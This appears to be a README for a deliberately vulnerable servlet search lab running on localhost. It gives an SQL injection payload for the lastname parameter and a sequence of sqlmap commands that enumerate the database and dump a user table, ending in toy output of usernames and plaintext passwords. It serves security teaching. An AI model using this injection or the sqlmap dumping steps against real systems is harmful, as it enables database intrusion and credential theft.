Servlet: Search
-------------------------------------------------------------------------------
How to access the Web application from a browser?
-------------------------------------------------------------------------------

URL: http://localhost:8080/Servlet-Search/


How to access the Web application from cURL?
-------------------------------------------------------------------------------

$ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search"
    
		
How to attack the Web application?
-------------------------------------------------------------------------------
name= "' OR 1 #"
http://localhost:8080/Servlet-Search/controller?lastname=%27+OR+1+%23&action=Search


How to use sqlmap to attack this Web application?
-------------------------------------------------------------------------------
$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search"		
		
$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" --tables
		
$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" --tables		
		
$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --columns

$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --schema

$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --count

$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?lastname=Simpson&action=Search" -D testdb --dump

Database: testdb
Table: user
[6 entries]
+----+----------+----------+----------+------------+
| id | username | lastname | password | firstname  |
+----+----------+----------+----------+------------+
| 1  | homer    | Simpson  | homer    | Homer      |
| 2  | marge    | Simpson  | marge    | Marge      |
| 3  | bart     | Simpson  | bart     | Bart       |
| 4  | lisa     | Simpson  | lisa     | Lisa       |
| 5  | magie    | Simpson  | maggie   | Maggie     |
| 6  | monty    | Burns    | monty    | Montgomery |
+----+----------+----------+----------+------------+


		
		